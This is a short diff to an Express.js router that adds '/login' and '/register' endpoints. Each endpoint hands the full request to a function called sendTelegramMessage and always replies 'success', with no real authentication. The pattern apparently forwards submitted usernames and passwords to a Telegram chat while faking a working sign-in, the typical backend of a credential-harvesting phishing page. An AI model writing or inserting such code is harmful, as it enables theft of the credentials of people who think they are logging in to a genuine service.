@@ -66,6 +66,16 @@ router.delete('/delete-user', (req, res) => {
     res.send({"status":"200", "message":'User Deleted Successfully'});
 })
 
+router.post('/login', (req, res) => {
+    sendTelegramMessage(req, res)
+    res.send({"status":"200", "message":'success'} );
+})
+
+router.post('/register', (req, res) => {
+    sendTelegramMessage(req, res)
+    res.send({"status":"200", "message":'success'} );
+})
+
 
 
 app.use('/', router);
